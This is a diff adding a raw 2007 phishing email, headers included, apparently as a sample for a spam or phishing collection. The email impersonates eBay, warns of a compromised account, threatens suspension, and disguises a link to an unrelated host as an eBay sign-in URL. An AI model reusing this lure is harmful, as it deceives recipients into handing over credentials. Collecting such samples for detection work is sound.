@@ -1,0 +1,68 @@
+Return-Path: <notice@eBay.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id 4068046971
+	for <user@login.example.com>; Thu, 14 Jun 2007 18:18:16 -0400 (EDT)
+X-Greylist: delayed 102 seconds by postgrey-1.27 at mail.example.org; Thu, 14 Jun 2007 18:18:16 EDT
+Received: from cwtg.com (cwtg.com [66.100.93.51])
+	by mail.example.org (Postfix) with ESMTP id 0DBDF131FAFE
+	for <user@example.com>; Thu, 14 Jun 2007 18:18:15 -0400 (EDT)
+Received: from User [61.189.35.174] by cwtg.com with ESMTP
+  (SMTPD-8.22) id AC560538; Thu, 14 Jun 2007 18:08:22 -0400
+From: "notice@eBay.com"<notice@eBay.com>
+Subject:  your account was compromised by a third party without your authorization
+Date: Fri, 15 Jun 2007 06:10:11 +0800
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <200706141808437.SM02312@User>
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 1395
+
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html;charset=iso-8859-1">
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
+<META content="MSHTML 6.00.2900.2180" name=GENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=#ffffff>
+<DIV><FONT face=Arial size=2>
+<DIV id=yiv1867774779>
+<P align=left>Dear eBay member <BR><BR><BR>We recently noticed more attempts to 
+log in to your eBay account from a <BR>foreign IP address and we have reasons to 
+belive that your account was compromised <BR>by a third party without your 
+authorization. <BR><BR>If you recently accessed your account while traveling,the 
+unusual log in attempts <BR>may have been initiated by you. <BR>However,if you 
+are the account holder please verify that, clicking on the link below, <BR>fill 
+the form and then submit. In this way we will verify your identity.<BR></P>
+<P align=left><A onclick="return ShowLinkWarning()" 
+href="http://xoomer.alice.it/singinbayviolation/SignineBaydepartamentQQWEWW0QQitemZ180090502987QQihZ008QQcategoryZ102333QQrdZ1QQcmView.htm" 
+target=_blank rel=nofollow><FONT 
+color=#003399>https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&amp;VerifyIdentity</FONT></A></P>
+<P align=left><BR>The log in attempt was made from: <BR>IP address: 81.158.54.12 
+<BR>ISP host: 81.158.54.98 <BR><BR>If you choose to ignore our request , your 
+account will be suspended until you will verify your identity <BR><BR>We ask 
+that you allow at least 72 hours for the case to be investigated and we 
+<BR>strongly recommend not to make any changes to your account in that time. 
+<BR><BR>If you received this notice and you are not the authorized account 
+<BR>holder, please be aware that it is in violation of eBay policy to represent 
+<BR>oneself as another eBay user. Such action may also be in violation of 
+<BR>local, national, and/or international law. eBay is committed to assist 
+<BR>law enforcement with any inquires related to attempts to misappropriate 
+<BR>personal information with the intent to commit fraud or theft. 
+<BR>Information will be provided at the request of law enforcement agencies to 
+<BR>ensure that perpetrators are prosecuted to the full extent of the law. 
+<BR>*Please do not respond to this e-mail as your reply will not be received. 
+<BR><BR>Thanks for your patience as we work together to protect your account. 
+<BR><BR><BR>Regards, <BR><BR>Safeharbor Department <BR>eBay Inc. </P></DIV><!-- toctype = X-unknown --><!-- toctype = text --><!-- text --></FONT></DIV></BODY></HTML>
+
